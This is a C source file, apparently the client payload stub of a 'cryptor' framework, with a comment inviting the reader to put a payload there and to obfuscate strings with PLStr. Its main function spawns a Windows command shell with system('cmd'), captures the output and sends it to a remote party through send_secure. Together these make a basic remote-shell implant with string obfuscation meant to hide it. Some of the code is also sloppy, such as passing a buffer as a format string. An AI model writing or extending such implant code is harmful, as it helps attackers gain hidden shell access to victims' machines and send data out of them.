#include "clientHeader.h"
#include <stdlib.h>
/*
 * Copyright (C) 2020  @Qu3b411 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */


/*
 *	****************************************************************
 *	YOUR PAYLOAD GOES HERE, THIS IS WHERE YOUR DEVELOPMENT WORK WILL
 *	BEGIN. HAVE FUN
 *	****************************************************************
 *
 * 	USE PLStr to secure all your binary strings
 */
 PL_int main(){
	/*
	 * as per microsoft docs, the max buffer size of STDOUT is 4k bytes
	 */
	char buffer[4096] = {0};
	fflush(stdout);
	freopen("NULL","a",stdout);
	setvbuf(stdout,buffer,_IONBF,1024);
	system("cmd");
	fprintf(stderr,buffer);
	send_secure(buffer,sizeof(buffer));
	 /*
	BYTE* tmp = "hello";
	send_secure(tmp,5);
	tmp = "world";
	send_secure(tmp,5);
	tmp = PLStr("data being sent from the cryptor"); 
	send_secure(tmp,32);
	printf("%s",PLStr("hello world from the cryptor\n"));
	printf("%s\n", recv_secure());
	printf("%s\n", recv_secure());
	return 1;*/
}

